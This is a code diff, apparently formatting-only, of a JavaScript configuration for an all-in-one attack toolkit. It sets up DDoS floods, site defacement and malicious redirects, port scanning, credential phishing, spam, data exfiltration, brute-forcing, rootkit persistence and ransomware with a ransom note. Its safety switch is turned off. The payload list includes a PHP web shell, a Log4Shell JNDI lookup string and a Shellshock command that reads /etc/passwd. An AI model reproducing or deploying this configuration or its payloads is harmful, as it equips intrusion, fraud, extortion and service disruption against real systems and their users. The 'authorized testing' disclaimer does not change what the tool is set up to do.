@@ -33,14 +33,14 @@ const credentials = {
       'TCP-AMP',
       'GAME-Flood3',
       'Rebind-Attack',
-      'Bypass'
+      'Bypass',
     ],
     maxThreads: 65535,
     maxConnections: 65535,
     packetSizes: [
-      64,   128,   256,   512,   1024,  2048,
-      4096, 8192,  16384, 32768, 65535, 131070,
-      262140, 524280, 1048560, 2097120
+      64, 128, 256, 512, 1024, 2048,
+      4096, 8192, 16384, 32768, 65535, 131070,
+      262140, 524280, 1048560, 2097120,
     ],
     torProxyList: [],
     userAgentFile: './main/ddos/useragents.txt',
@@ -57,7 +57,7 @@ const credentials = {
         'tls_fingerprint',
         'ua_spoof',
         'cookie_injection',
-        'race_condition'
+        'race_condition',
       ],
       headers: {
         'X-Forwarded-For': '',
@@ -75,7 +75,7 @@ const credentials = {
         'DNT': '1',
         'X-Requested-With': 'XMLHttpRequest',
         'X-Noodles-Bypass': 'true',
-        'Cookie': ''
+        'Cookie': '',
       },
     },
     advancedOptions: {
@@ -87,14 +87,14 @@ const credentials = {
       maxRetries: 10,
       concurrentConnections: 4096,
       socketTimeout: 15,
-      tcpNoDelay: true
+      tcpNoDelay: true,
     },
     httpRawOptions: {
       get:
           'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n',
       post:
           'POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {useragent}\r\nContent-Length: {randomDataLength}\r\nConnection: keep-alive\r\nX-Noodles-Raw: true\r\n\r\n{data}\r\n',
-      randomDataLength: 4096
+      randomDataLength: 4096,
     },
     tlsOptions: {
       ciphers:
@@ -102,9 +102,9 @@ const credentials = {
       ecdhCurve: 'prime256v1',
       honorCipherOrder: true,
       secureProtocol: 'TLSv1_2_method',
-      rejectUnauthorized: false
+      rejectUnauthorized: false,
     },
-    proxyRotationInterval: 10000
+    proxyRotationInterval: 10000,
   },
   defacement: {
     payloads: {
@@ -127,12 +127,12 @@ const credentials = {
       'message':
           '<body bgcolor="black"><center><h1 style="color:orange;">IMPORTANT MESSAGE</h1><p style="color:white;">{customMessage}</p></center></body>',
       'redirect':
-          '<script>window.location.href = "{redirectUrl}";</script><body bgcolor="black"><center><h1 style="color:blue;">REDIRECTING</h1><p style="color:white;">You are being redirected to another site.</p></center></body>'
+          '<script>window.location.href = "{redirectUrl}";</script><body bgcolor="black"><center><h1 style="color:blue;">REDIRECTING</h1><p style="color:white;">You are being redirected to another site.</p></center></body>',
     },
     injectionPoints: [
-      '</body>', '</html>', '<head>',  '<form>',
-      '<div>',   '<script>', '<iframe>', '<meta>',
-      'title',   '<header>', '<footer>', '<nav>'
+      '</body>', '</html>', '<head>', '<form>',
+      '<div>', '<script>', '<iframe>', '<meta>',
+      'title', '<header>', '<footer>', '<nav>',
     ],
     autoReplace: true,
     imageUrls: [],
@@ -143,17 +143,17 @@ const credentials = {
     excludePaths: ['/wp-admin', '/admin', '/login', '/api', '/css', '/js'],
     httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
     dynamicInjection: false,
-    dynamicPayloadUrl: ''
+    dynamicPayloadUrl: '',
   },
   connection: {
     ports: [
-      21,    22,    23,    80,    443,   8080,  25,    110,
-      143,   587,   993,   995,   3306,  3389,  27017, 6379,
-      5432,  1433,  1521,  33060, 5060,  5061,  8443,  9200,
-      28017, 27015, 25565, 47808, 11211, 6667,  6668,  6669,
-      7000,  8000,  8008,  8009,  8888,  9000,  9001,  9090,
-      9999,  10000, 11000, 12345, 20000, 30000, 40000, 50000,
-      60000, 65535
+      21, 22, 23, 80, 443, 8080, 25, 110,
+      143, 587, 993, 995, 3306, 3389, 27017, 6379,
+      5432, 1433, 1521, 33060, 5060, 5061, 8443, 9200,
+      28017, 27015, 25565, 47808, 11211, 6667, 6668, 6669,
+      7000, 8000, 8008, 8009, 8888, 9000, 9001, 9090,
+      9999, 10000, 11000, 12345, 20000, 30000, 40000, 50000,
+      60000, 65535,
     ],
     timeout: 500,
     scanType: [
@@ -171,7 +171,7 @@ const credentials = {
       'ICMP-Ping',
       'Reverse-DNS',
       'Service-Version',
-      'Firewall-Detection'
+      'Firewall-Detection',
     ],
     concurrency: 4096,
     stealthMode: true,
@@ -180,14 +180,14 @@ const credentials = {
     delay: 5,
     ipFragmentation: true,
     ttl: 128,
-    rateLimit: 20000
+    rateLimit: 20000,
   },
   logs: {
     maxEntries: 1000000,
     logLevel: [
-      'info',      'warn',     'error',    'debug',
-      'verbose',   'security', 'attack',   'scan',
-      'exploit',   'defacement', 'phishing'
+      'info', 'warn', 'error', 'debug',
+      'verbose', 'security', 'attack', 'scan',
+      'exploit', 'defacement', 'phishing',
     ],
     fileRotation: true,
     maxLogFiles: 60,
@@ -252,7 +252,7 @@ const credentials = {
       deface: 'Ctrl+D',
       exploit: 'Ctrl+E',
       sniff: 'Ctrl+N',
-      stop: 'Ctrl+X'
+      stop: 'Ctrl+X',
     },
   },
   apiKeys: [],
@@ -347,7 +347,7 @@ const credentials = {
     sqlInjectionScanner: true,
     lfiScanner: true,
     rfiScanner: true,
-    csrfScanner: true
+    csrfScanner: true,
   },
   spam: {
     email: {
@@ -377,7 +377,7 @@ const credentials = {
         'You have won a free Noodle!',
         'Your account has been Noodled.',
         'Claim your free Noodle now!',
-        'Urgent: Your Noodles account is compromised.'
+        'Urgent: Your Noodles account is compromised.',
       ],
     },
     socialMedia: {
@@ -387,14 +387,14 @@ const credentials = {
         facebook: 'FACEBOOK_API_KEY',
         instagram: 'INSTAGRAM_API_KEY',
         tiktok: 'TIKTOK_API_KEY',
-        youtube: 'YOUTUBE_API_KEY'
+        youtube: 'YOUTUBE_API_KEY',
       },
       rateLimit: 100,
       spamMessages: [
         'Get Noodled!',
         'Noodles are the best!',
         'Noodles are taking over!',
-        'Join the Noodle revolution!'
+        'Join the Noodle revolution!',
       ],
     },
     pushNotifications: {
@@ -405,9 +405,9 @@ const credentials = {
         'Noodles Alert!',
         'A new Noodle is available!',
         'Your Noodle is ready!',
-        'Claim your free Noodle now!'
+        'Claim your free Noodle now!',
       ],
-    }
+    },
   },
   phishing: {
     cloneWebsite: true,
@@ -417,7 +417,7 @@ const credentials = {
       'signup': 'http://example.com/signup.html',
       'password_reset': 'http://example.com/reset.html',
       'credit_card': 'http://example.com/credit_card.html',
-      'bank_account': 'http://example.com/bank_account.html'
+      'bank_account': 'http://example.com/bank_account.html',
     },
     sslEnabled: true,
     captureCredentials: true,
@@ -484,9 +484,9 @@ const credentials = {
   dataExfiltration: {
     enabled: false,
     exfiltrationMethod: [
-      'FTP',       'HTTP',       'DNS',        'Email',
-      'ICMP',      'TOR',        'WebSockets', 'CloudStorage',
-      'Telegram',  'Discord'
+      'FTP', 'HTTP', 'DNS', 'Email',
+      'ICMP', 'TOR', 'WebSockets', 'CloudStorage',
+      'Telegram', 'Discord',
     ],
     exfiltrationServer: 'ftp.example.com',
     exfiltrationPath: '/data',
@@ -520,7 +520,7 @@ const credentials = {
       'Command Injection',
       'Authentication Bypass',
       'Privilege Escalation',
-      'Deserialization'
+      'Deserialization',
     ],
     customExploits: [
       {
@@ -529,7 +529,7 @@ const credentials = {
         target: 'RCE',
         description: 'Custom RCE exploit for specific vulnerability',
         references: ['CVE-2023-XXXX', 'http://example.com/exploit'],
-      }
+      },
     ],
     fuzzingEnabled: true,
     payloadList: [
@@ -541,7 +541,7 @@ const credentials = {
       'eval($_POST[cmd]);',
       '<?php system($_GET[cmd]); ?>',
       '${jndi:ldap://example.com/evil}',
-      '(){ :;}; /bin/bash -c "cat /etc/passwd"'
+      '(){ :;}; /bin/bash -c "cat /etc/passwd"',
     ],
     autoTargetDiscovery: true,
     exploitDatabaseIntegration: true,
@@ -574,7 +574,7 @@ const credentials = {
     targetSites: [
       'http://example.com/login',
       'http://target.com/login',
-      'https://target.com/login'
+      'https://target.com/login',
     ],
     captchaBypass: true,
     proxyRotation: true,
@@ -594,7 +594,7 @@ const credentials = {
     promiscuousMode: true,
     captureAllTraffic: true,
     filterRules: [
-      'port 80', 'port 443', 'host example.com', 'tcp', 'udp', 'icmp'
+      'port 80', 'port 443', 'host example.com', 'tcp', 'udp', 'icmp',
     ],
     packetAnalysis: true,
     protocolDissection: true,
@@ -621,7 +621,7 @@ const credentials = {
       'Registry Keys',
       'Cron Jobs',
       'Bashrc Modification',
-      'Systemd Services'
+      'Systemd Services',
     ],
     rootkitInstallation: true,
     bypassUac: true,
@@ -655,7 +655,7 @@ const credentials = {
       'Fake Job Offer',
       'Emergency Assistance',
       'Winning Lottery',
-      'Government Survey'
+      'Government Survey',
     ],
     spearPhishingCampaign: true,
     vishingCampaign: true,
@@ -663,7 +663,7 @@ const credentials = {
       'Infected USB Drives',
       'Free Software Download',
       'Misconfigured Printer',
-      'Fake QR Codes'
+      'Fake QR Codes',
     ],
     quidProQuo: true,
     tailgating: true,
@@ -674,7 +674,7 @@ const credentials = {
       'Reciprocity',
       'Social Proof',
       'Liking',
-      'Commitment and Consistency'
+      'Commitment and Consistency',
     ],
     psychologicalManipulation: true,
     emotionalExploitation: true,
@@ -690,7 +690,7 @@ const credentials = {
     encryptionAlgorithm: 'AES-256',
     fileExtensions: [
       '.docx', '.pdf', '.jpg', '.zip', '.xls', '.ppt', '.txt', '.db', '.sql',
-      '.mp3', '.mp4', '.avi'
+      '.mp3', '.mp4', '.avi',
     ],
     ransomNote:
         'Your files have been encrypted. Pay Bitcoin to recover them. Contact us at support@example.com.',
@@ -726,7 +726,7 @@ const credentials = {
   },
   safety: {
     disableDangerousFeatures: false,
-    disabledModules: []
+    disabledModules: [],
   },
   functions: {
     generateRandomIps(count) {
@@ -765,33 +765,33 @@ const credentials = {
     },
 
     validateEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
     },
     isSafe(input) {
       // Basic XSS sanitization: remove script tags
       let safeInput = input.replace(/<script[^>]*>.*?<\/script>/gi, '');
       // Basic SQL injection sanitization: escape single quotes
-      safeInput = safeInput.replace(/'/g, "&#039;");
+      safeInput = safeInput.replace(/'/g, '&#039;');
       return safeInput;
-    }
+    },
   },
   legal: {
-        termsOfService: 'You agree to use this tool responsibly and ethically. Misuse is prohibited.',
-        acceptableUsePolicy: 'This tool should only be used for authorized penetration testing and security research.',
-        disclaimer: 'The developers are not liable for any damages caused by the misuse of this tool.'
-    },
-    settings:{
-        logLevel:'debug'
-    }
+    termsOfService: 'You agree to use this tool responsibly and ethically. Misuse is prohibited.',
+    acceptableUsePolicy: 'This tool should only be used for authorized penetration testing and security research.',
+    disclaimer: 'The developers are not liable for any damages caused by the misuse of this tool.',
+  },
+  settings: {
+    logLevel: 'debug',
+  },
 };
 
 if (credentials.safety.disableDangerousFeatures) {
   credentials.safety.disabledModules.forEach(moduleName => {
     if (credentials[moduleName]) {
-      if (credentials.settings.logLevel === 'debug'){
-          console.warn(
-              `[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
+      if (credentials.settings.logLevel === 'debug') {
+        console.warn(
+            `[SECURITY] Disabling potentially dangerous module: ${moduleName}`);
       }
       for (const key in credentials[moduleName]) {
         if (typeof credentials[moduleName][key] === 'boolean') {
